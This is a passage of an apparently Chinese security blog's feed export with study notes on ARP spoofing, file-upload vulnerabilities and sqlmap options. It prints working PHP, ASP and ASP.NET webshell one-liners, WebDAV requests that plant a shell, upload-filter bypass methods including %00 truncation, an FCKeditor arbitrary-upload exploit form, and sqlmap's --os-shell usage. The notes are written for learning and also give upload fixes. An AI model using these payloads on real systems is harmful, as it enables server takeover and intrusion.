class="line-numbers-rows"><span></span></span></code></pre>假设要跟主机1.1.1.1通信，就首先查找arp表，在arp表中找到1.1.1.1对应的硬件地址后，就会给这个数据包添加一个硬件地址(11:11:11:11:11:11),然后将该数据包交给交换机，交换机就会根据数据包中的硬件地址从CAM表中找到该硬件地址对应的端口，就会将该数据包发送给连接该端口的主机<br>假设要跟主机2.2.2.2通信，就首先查找arp表，如果找不到对应的表项，就不知道2.2.2.2所对应的硬件地址，这时就需要使用arp了。主机就会向局域网中发送一个arp请求的广播包，内容大概是“我的ip是x.x.x.x,我的物理地址是xx:xx:xx:xx:xx:xx,ip地址为2.2.2.2的主机在吗，我需要和你进行通信，请告诉我你的物理地址，收到请回答!”，因为该数据包是广播包，因此局域网中所有的主机都能收到，但只有目标主机2.2.2.2会给出回应。目标主机2.2.2.2首先会将接收到的arp请求包中的发送端的ip和硬件地址作为新的表项添加到自己的arp表中，然后向发送端发送一个arp响应包，内容大概是“我就是那个ip地址为2.2.2.2的主机，我的物理地址是22:22:22:22:22:22”。发送端接收到该arp响应包后，就会将数据包中的ip和硬件地址作为新的表项添加到自己的arp表中。</li></ul></li><li>arp缺陷<br>arp协议通信的过程并没有任何的认证机制，也就是说一台主机收到arp请求数据包，它就会将数据包中的ip和mac地址添加到自己的arp缓存表中，并不会判断该数据包是否真的来自于该ip对应的主机。由于没有对数据包的真伪进行判断，因此就可以利用该漏洞来冒充网关等主机</li></ul><h3 id="arp欺骗原理"><a href="#arp欺骗原理" class="headerlink" title="arp欺骗原理"></a>arp欺骗原理</h3><p>arp中规定，只要主机收到一个arp请求之后，不会判断这个请求的真伪，就会直接将请求中的ip地址和物理地址添加到arp表中。如果之前有了相同ip地址的表项，就对其修改，这种方式称为动态arp表</p><h3 id="arpspoof使用"><a href="#arpspoof使用" class="headerlink" title="arpspoof使用"></a>arpspoof使用</h3><pre class="line-numbers language-none"><code class="language-none">arpspoof [-i指定使用的网卡] [-t要欺骗的目标主机] [-r双向欺骗] 要伪装成的主机例：arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="主机开启转发功能"><a href="#主机开启转发功能" class="headerlink" title="主机开启转发功能"></a>主机开启转发功能</h3><pre class="line-numbers language-none"><code class="language-none">echo 1 &gt;&gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：通过arp欺骗截获目标主机发往网关的数据包之后，我们需要在本机开启转发功能，使截获的数据包能够再转发给网关，让目标主机可以正常上网</p><h1 id="python实现arp欺骗"><a href="#python实现arp欺骗" class="headerlink" title="python实现arp欺骗"></a>python实现arp欺骗</h1>]]></content>
      
      
      <categories>
          
          <category> python攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>上传漏洞</title>
      <link href="/2021/12/15/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/12/15/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h1><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS-6-0解析漏洞："><a href="#IIS-6-0解析漏洞：" class="headerlink" title="IIS 6.0解析漏洞："></a>IIS 6.0解析漏洞：</h3><ul><li>当建立*.asa或*.asp目录时(如1.asa或1.asp目录),其目录下的所有文件会被IIS当作asp文件来解析</li><li>当文件为*.asp;1.jpg时(如test.asp;1.jpg),该文件也会被IIS以asp脚本来执行</li></ul><h3 id="WebDav漏洞-服务器开启webdav扩展，并且支持put-move-copy-delete等方法-："><a href="#WebDav漏洞-服务器开启webdav扩展，并且支持put-move-copy-delete等方法-：" class="headerlink" title="WebDav漏洞(服务器开启webdav扩展，并且支持put,move,copy,delete等方法)："></a>WebDav漏洞(服务器开启webdav扩展，并且支持put,move,copy,delete等方法)：</h3><p>WebDav(web-based distributed authoring and versioning),是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议</p><h4 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h4><h5 id="通过options方法探测服务器支持的HTTP方法："><a href="#通过options方法探测服务器支持的HTTP方法：" class="headerlink" title="通过options方法探测服务器支持的HTTP方法："></a>通过options方法探测服务器支持的HTTP方法：</h5><pre class="line-numbers language-none"><code class="language-none">OPTIONS &#x2F; HTTP&#x2F;1.1Host: www.secbug.org<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="通过put方法向服务器上传脚本文件："><a href="#通过put方法向服务器上传脚本文件：" class="headerlink" title="通过put方法向服务器上传脚本文件："></a>通过put方法向服务器上传脚本文件：</h5><pre class="line-numbers language-none"><code class="language-none">PUT &#x2F;a.txt HTTP&#x2F;1.1Host:www.secbug.orgContent-Length:30            &lt;% eval request(&quot;chopper&quot;)%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="通过move或copy方法改名"><a href="#通过move或copy方法改名" class="headerlink" title="通过move或copy方法改名:"></a>通过move或copy方法改名:</h5><pre class="line-numbers language-none"><code class="language-none">COPY &#x2F;a.txt HTTP&#x2F;1.1Host: www.secbug.org      Destination:http:&#x2F;&#x2F;www.secbug.org&#x2F;cmd.asp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="删除服务器任意文件"><a href="#删除服务器任意文件" class="headerlink" title="删除服务器任意文件:"></a>删除服务器任意文件:</h4><pre class="line-numbers language-none"><code class="language-none">DELETE &#x2F;a.txt HTTP&#x2F;1.1Host: www.secbug.org<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="探测目标服务器是否存在WebDav的安全隐患："><a href="#探测目标服务器是否存在WebDav的安全隐患：" class="headerlink" title="探测目标服务器是否存在WebDav的安全隐患："></a>探测目标服务器是否存在WebDav的安全隐患：</h4><p>工具：IIS Write</p><h3 id="Apache解析漏洞："><a href="#Apache解析漏洞：" class="headerlink" title="Apache解析漏洞："></a>Apache解析漏洞：</h3><h4 id="版本："><a href="#版本：" class="headerlink" title="版本："></a>版本：</h4><p>apache 1.x , apache 2.x</p><h4 id="apache解析文件原则："><a href="#apache解析文件原则：" class="headerlink" title="apache解析文件原则："></a>apache解析文件原则：</h4><p>当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的扩展名为止；如果都不认识，则会暴露其源代码</p><h4 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h4><p>1.php.rar.as.ss #apache首先解析ss扩展名，如果不认识，就会解析as扩展名，如果不认识，接着就会解析rar扩展名，如果不认识，就会再解析php扩展名，php认识的话，就会把该文件以php脚本来解析</p><h4 id="Apache认识的扩展名："><a href="#Apache认识的扩展名：" class="headerlink" title="Apache认识的扩展名："></a>Apache认识的扩展名：</h4><p>Apache安装目录&#x2F;config&#x2F;mime.types中定义</p><h3 id="PHP-CGI解析漏洞-nginx解析漏洞"><a href="#PHP-CGI解析漏洞-nginx解析漏洞" class="headerlink" title="PHP CGI解析漏洞(nginx解析漏洞):"></a>PHP CGI解析漏洞(nginx解析漏洞):</h3><h4 id="例"><a href="#例" class="headerlink" title="例:"></a>例:</h4><p><a href="http://www.secbug.org/1.jpg/1.php">http://www.secbug.org/1.jpg/1.php</a><br>注:1.php并不存在，1.jpg会被以php脚本来解析<br>(1.php不是特定的，可以是*.php)</p><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>在php的配置文件中有一个关键的选项：<br>cgi.fix_pathinfo ,这个选项在某些php版本中是默认开启的,在开启时访问url, 例：<a href="http://www.secbug.org/a.txt/a.php">http://www.secbug.org/a.txt/a.php</a> ,由于a.php是不存在的，所以PHP将会向前递归解析，将前面的a.txt以php脚本来解析，于是造成了解析漏洞。<br>注：此漏洞与nginx关系不大，但由于nginx与php配合很容易造成这种解析漏洞，所以PHP CGI漏洞常常被认为是nginx解析漏洞</p><h2 id="绕过上传漏洞"><a href="#绕过上传漏洞" class="headerlink" title="绕过上传漏洞"></a>绕过上传漏洞</h2><h3 id="程序员防护上传漏洞的措施"><a href="#程序员防护上传漏洞的措施" class="headerlink" title="程序员防护上传漏洞的措施"></a>程序员防护上传漏洞的措施</h3><h4 id="客户端检测："><a href="#客户端检测：" class="headerlink" title="客户端检测："></a>客户端检测：</h4><p>客户端使用javascript检测，在文件未上传时，就对文件进行验证</p><h4 id="服务器端检测："><a href="#服务器端检测：" class="headerlink" title="服务器端检测："></a>服务器端检测：</h4><p>服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法，甚至有些会检测文件中是否嵌入恶意代码</p><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><h4 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h4><p><a href="http://www.maicaidao.com/">http://www.maicaidao.com</a></p><h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP:"></a>PHP:</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'caidao'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP:"></a>ASP:</h5><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;%eval request(&quot;caidao&quot;)%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="ASP-NET"><a href="#ASP-NET" class="headerlink" title="ASP.NET:"></a>ASP.NET:</h5><pre class="line-numbers language-asp.net" data-language="asp.net"><code class="language-asp.net">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;chopper&quot;],&quot;unsafe&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="制作图片一句话木马"><a href="#制作图片一句话木马" class="headerlink" title="制作图片一句话木马"></a>制作图片一句话木马</h3><p>制作软件：Edjpgcom</p><h3 id="客户端检测绕过"><a href="#客户端检测绕过" class="headerlink" title="客户端检测绕过"></a>客户端检测绕过</h3><h4 id="FireBug绕过客户端检测"><a href="#FireBug绕过客户端检测" class="headerlink" title="FireBug绕过客户端检测"></a>FireBug绕过客户端检测</h4><h5 id="FireBug介绍"><a href="#FireBug介绍" class="headerlink" title="FireBug介绍"></a>FireBug介绍</h5><p>FireBug是一款开源的浏览器插件；它支持Firefox、Chrome等浏览器。它可以让Web开发者轻松地调试HTML、JavaScript、AJAX、CSS等前端脚本代码。FireBug像一把瑞士军刀，从不同的角度剖析Web页面内部的细节层面，属于Web开发人员的必备武器。正由于FireBug功能强大，所以也被黑客认为是必备利器。</p><h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><p>当单击“提交”按钮时，form表单就会触发onsubmit事件，该事件就会调用对应的函数或脚本(比如示例中的checkFile函数)对上传的文件的后缀名进行检测，如果后缀名合法，返回一个布尔值true,则提交表单到服务器；否则，返回一个布尔值false,程序退出，文件将无法提交到服务器。</p><ul><li>示例代码<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onsubmit</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">checkFile</span><span class="token punctuation">"</span></span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>使用FireBug将onsubmit事件删除，就可以绕过javascript函数(如checkFile)的验证</li></ul><h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><h5 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h5><p>首先将木马文件的扩展名改为合法的扩展名，由于扩展名是合法的，因此就可以通过客户端javascript验证,然后在上传时我们使用burpsuite拦截上传数据，将木马文件的扩展名再改回为原来的脚本扩展名(如：php),就可以绕过客户端验证。</p><h5 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h5><p>在HTTP协议中有请求头Content-Length,代表实体正文长度，如果此时的 filename 修改也就意味着实体正文长度增加或者减少了，这时就应该修改 Content-Length请求头，如：Content-Length长度为200,把文件流中的 filename&#x3D;”xxser.jpg”修改为 filename&#x3D;＂1.php”。更改后，实体正文少了4个字符，所以需要把Content-Length修改 为196,如果不修改上传可能会失败。</p><h3 id="服务器端检测绕过"><a href="#服务器端检测绕过" class="headerlink" title="服务器端检测绕过"></a>服务器端检测绕过</h3><h4 id="白名单与黑名单验证绕过"><a href="#白名单与黑名单验证绕过" class="headerlink" title="白名单与黑名单验证绕过"></a>白名单与黑名单验证绕过</h4><h5 id="黑名单验证绕过"><a href="#黑名单验证绕过" class="headerlink" title="黑名单验证绕过"></a>黑名单验证绕过</h5><ul><li>黑名单原理<br><em><strong>黑名单过滤是一种不安全的方式</strong></em>，黑名单定义了一系列不安全的扩展名，服务器端在接收文件后，与黑名单扩展名对比，如果发现文件扩展名与黑名单里的扩展名匹配，则认为文件不合法</li><li>黑名单绕过方法<ul><li>攻击者可以上传黑名单中忽略的扩展名的脚本文件</li><li>假如服务端代码对上传的文件的后缀名没有做大小写转换，可以通过上传一些后缀名中掺杂大小写的脚本文件，而该扩展名又未包含在黑名单中，由于Windows大小写不敏感，因此此类扩展名依然会被windows平台的web容器解析</li><li>在Windows系统下，当文件名以点（.）或者空格（ ）结尾时，Windows会自动去除点（.）或空格，利用这一特性，可以上传xxx.asp.或xxx.asp （p后面为空格）,服务端在接收到文件名后进行写文件操作时，Windows将会自动去除结尾的.或空格</li></ul></li></ul><h5 id="白名单验证绕过"><a href="#白名单验证绕过" class="headerlink" title="白名单验证绕过"></a>白名单验证绕过</h5><ul><li>白名单原理<br><em><strong>白名单比黑名单安全，但并不能完全防御上传漏洞</strong></em>，白名单规定了允许上传的后缀名，上传的文件后缀名在白名单中，则允许上传，否则不允许上传</li><li>白名单绕过方法<br>搭配web容器的解析漏洞，可以上传类似xx.asp;1.jpg文件，由于jpg是合法的后缀名，因此就可以通过白名单验证上传该文件，又由于目标服务器存在解析漏洞（假设为iis 6.0解析漏洞），则该xx.asp;1.jpg就会以asp脚本来解析</li><li>注：<em><strong>白名单机制仅仅是防御上传漏洞的第一步</strong></em></li></ul><h4 id="MIME验证绕过"><a href="#MIME验证绕过" class="headerlink" title="MIME验证绕过"></a>MIME验证绕过</h4><h5 id="MIME验证原理"><a href="#MIME验证原理" class="headerlink" title="MIME验证原理"></a>MIME验证原理</h5><p>服务端代码会对上传文件请求数据中的Content-Type做验证，如果Content-Type是合法的,就允许上传，否则不允许上传</p><h5 id="MIME验证绕过-1"><a href="#MIME验证绕过-1" class="headerlink" title="MIME验证绕过"></a>MIME验证绕过</h5><p>使用burpsuite拦截上传文件请求数据包，将要上传文件的不合法的Content-Type改为合法的即可绕过MIME验证</p><h4 id="目录验证利用"><a href="#目录验证利用" class="headerlink" title="目录验证利用"></a>目录验证利用</h4><h5 id="目录验证原理"><a href="#目录验证原理" class="headerlink" title="目录验证原理"></a>目录验证原理</h5><p>在文件上传时，程序通常允许用户将文件放到指定的目录中。有些web开发人员为了让代码更“健壮”，通常会做一个操作：<em><strong>如果指定的目录存在，就将文件写入目录中，不存在则先建立目录，然后再写入</strong></em>，由于文件上传时默认的文件夹可以在html隐藏标签中定义</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Extension<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="目录验证利用方法"><a href="#目录验证利用方法" class="headerlink" title="目录验证利用方法"></a>目录验证利用方法</h5><p>假如目标服务器存在IIS 6.0解析漏洞,我们就可以使用FireBug将value的值改为xxx.asp,服务端首先会判断该xxx.asp目录是否存在，自然不存在，服务器端就会创建xxx.asp目录，这时我们就可以上传包含asp一句话木马的任意文件，该文件就会上传到xxx.asp目录中，由于存在IIS 6.0解析漏洞，xxx.asp目录下的所有文件都会以asp来解析，因此获取webshell</p><h4 id="截断上传攻击"><a href="#截断上传攻击" class="headerlink" title="截断上传攻击"></a>截断上传攻击</h4><h5 id="截断上传攻击原理"><a href="#截断上传攻击原理" class="headerlink" title="截断上传攻击原理"></a>截断上传攻击原理</h5><p><em><strong>截断上传攻击在ASP程序中最常见</strong></em><br>核心原理： <em><strong>%00截断</strong></em></p><h5 id="截断上传攻击方法"><a href="#截断上传攻击方法" class="headerlink" title="截断上传攻击方法"></a>截断上传攻击方法</h5><p>使用burp拦截文件上传请求数据，将文件上传名称更改为1.asp空格xxx.jpg，然后单击HEX选项卡进入十六进制编辑模式，将文件名中空格的十六进制数20改为00，即NULL,单击GO按钮，可以发现最终上传的文件为1.asp,1.asp后面的字符已经被截断</p><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><ul><li>文件上传名称的位置（下图中的filename&#x3D;”xxser.jpg”）<br><img src="/1.png"></li><li>截断上传漏洞不仅出现在asp程序上，在php,jsp程序中也存在这样的问题</li></ul><h2 id="文本编辑器上传漏洞"><a href="#文本编辑器上传漏洞" class="headerlink" title="文本编辑器上传漏洞"></a>文本编辑器上传漏洞</h2><h3 id="常见的文本编辑器"><a href="#常见的文本编辑器" class="headerlink" title="常见的文本编辑器"></a>常见的文本编辑器</h3><p>CKEditor,Ewebeditor,UEditor,KindEditor,XHeditor等，这类编辑器的功能非常类似，比如都有图片上传，视频上传，远程下载等功能。这类文本编辑器也称为富文本编辑器</p><h3 id="FCKeditor编辑器漏洞（FCKeditor现已更名为CKEditor）"><a href="#FCKeditor编辑器漏洞（FCKeditor现已更名为CKEditor）" class="headerlink" title="FCKeditor编辑器漏洞（FCKeditor现已更名为CKEditor）"></a>FCKeditor编辑器漏洞（FCKeditor现已更名为CKEditor）</h3><h4 id="FCKeditor简介"><a href="#FCKeditor简介" class="headerlink" title="FCKeditor简介"></a>FCKeditor简介</h4><p>FCKeditor是一个开源，所见即所得的文字编辑器，可以适用于asp&#x2F;php&#x2F;aspx&#x2F;jsp等脚本类型网站。</p><h4 id="FCKeditor编辑器漏洞"><a href="#FCKeditor编辑器漏洞" class="headerlink" title="FCKeditor编辑器漏洞"></a>FCKeditor编辑器漏洞</h4><h5 id="敏感信息暴露"><a href="#敏感信息暴露" class="headerlink" title="敏感信息暴露"></a>敏感信息暴露</h5><p>FCKeditor目录存在一些敏感文件，如果这些文件不删除，攻击者就会快速得到一些敏感信息</p><ul><li>查看版本信息<br>&#x2F;FCKeditor&#x2F;editor&#x2F;dialog&#x2F;fck_about.html</li><li>默认上传页面<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;browser.html<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;test.html<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;upload&#x2F;test.html<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;test.html<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;uploadtest.html</li><li>其他敏感文件<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp<br>&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;php&#x2F;connector.php</li></ul><h5 id="黑名单策略错误"><a href="#黑名单策略错误" class="headerlink" title="黑名单策略错误"></a>黑名单策略错误</h5><ul><li>影响版本： &lt;&#x3D;2.4.3</li><li>原因<br>黑名单过滤了一些常见的文件扩展名，但忽略了asa,cer等未知风险扩展名</li><li>利用<br>攻击者可直接上传asa,cer等危险脚本文件</li></ul><h5 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h5><ul><li><p>影响版本： &lt;&#x3D;2.4.2</p></li><li><p>原因<br>服务端程序获取用户上传的文件的文件类型，并判断是否是File,Image,Flash,Media中的一种，如果是，将会取得该文件类型允许的上传格式（后缀名），但是它在格式配置文件中却未定义Media文件类型的允许或不允许上传的格式，导致可以上传任意类型文件</p></li><li><p>利用</p><ul><li><p>使用burp拦截上传请求数据，将请求地址改为upload.php?Type&#x3D;Media,然后上传</p></li><li><p>通过构造HTML表单</p>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tiitle</span><span class="token punctuation">></span></span>FCKeditor任意文件上传exp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tiitle</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://1.1.1.1/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file_upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>注：<br>FCKeditor中还存在其他的漏洞，如：asp.net二次上传、建立畸形文件夹等漏洞</p></li></ul><h2 id="修复上传漏洞"><a href="#修复上传漏洞" class="headerlink" title="修复上传漏洞"></a>修复上传漏洞</h2><h3 id="上传漏洞形成的最终原因主要有"><a href="#上传漏洞形成的最终原因主要有" class="headerlink" title="上传漏洞形成的最终原因主要有"></a>上传漏洞形成的最终原因主要有</h3><ul><li>目录过滤不严，攻击者可能建立畸形目录</li><li>文件未重命名，攻击者可能利用web容器解析漏洞</li></ul><h3 id="在代码阶段解决上传漏洞的步骤"><a href="#在代码阶段解决上传漏洞的步骤" class="headerlink" title="在代码阶段解决上传漏洞的步骤"></a>在代码阶段解决上传漏洞的步骤</h3><ul><li>1.接收文件名及其文件临时路径</li><li>2.获取扩展名与白名单做对比，如果扩展名没有命中白名单则程序退出</li><li>3.对文件进行重命名<br>  注：只能在代码阶段基本解决上传漏洞，但不能说绝对防御，因为没有绝对的安全<ul><li>例：假如web容器是apache,apache默认不支持识别rar文件，因此我们可以利用apache解析漏洞，上传一个名为xxx.php.rar的含有恶意代码的文件，该文件就会以php脚本来解析。</li></ul></li></ul><h3 id="注：安全是一个整体，不仅要在程序编写上注意，在服务器配置，web容器配置上也要注意"><a href="#注：安全是一个整体，不仅要在程序编写上注意，在服务器配置，web容器配置上也要注意" class="headerlink" title="注：安全是一个整体，不仅要在程序编写上注意，在服务器配置，web容器配置上也要注意"></a>注：安全是一个整体，不仅要在程序编写上注意，在服务器配置，web容器配置上也要注意</h3>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap使用</title>
      <link href="/2021/12/15/Sqlmap%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/12/15/Sqlmap%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLMAP参数"><a href="#SQLMAP参数" class="headerlink" title="SQLMAP参数"></a>SQLMAP参数</h1><ul><li><p>测试注入点权限：</p><pre class="line-numbers language-none"><code class="language-none">--privileges #测试所有用户的权限--privileges -U sa #测试sa用户的权限(sa为用户名)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>执行shell命令:</p><pre class="line-numbers language-none"><code class="language-none">--os-cmd&#x3D;&quot;net user&quot; #执行系统命令net user--os-shell #返回与操作系统交互的shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>获取当前数据库名称:</p><pre class="line-numbers language-none"><code class="language-none">--current-db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>执行SQL命令:</p><pre class="line-numbers language-none"><code class="language-none">--sql-shell #返回与SQL交互的shell--sql-query&#x3D;&quot;select user()&quot; #执行sql语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>POST提交方式:</p><pre class="line-numbers language-none"><code class="language-none">--data &quot;username&#x3D;admin&amp;password&#x3D;123&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>显示详细的等级:</p><pre class="line-numbers language-none"><code class="language-none">-v 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注: 0 #只显示python的回溯，错误和关键消息<br>  1 #显示信息和警告消息(默认)<br>  2 #显示调试信息<br>  3 #有效载荷注入<br>  4 #显示HTTP请求(请求头和请求内容)<br>  5 #显示HTTP响应头<br>  6 #显示HTTP响应的页面内容</p></li><li><p>注入HTTP请求:</p><pre class="line-numbers language-none"><code class="language-none">-r request.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>request.txt内容:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">POST <span class="token operator">/</span>login<span class="token punctuation">.</span>php HTTP<span class="token operator">/</span><span class="token number">1.1</span>Host: www<span class="token punctuation">.</span>secbug<span class="token punctuation">.</span>com<span class="token keyword">User</span><span class="token operator">-</span>Agent: Mozilla<span class="token operator">/</span><span class="token number">5.0</span>        username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>直接连接到数据库:</p><pre 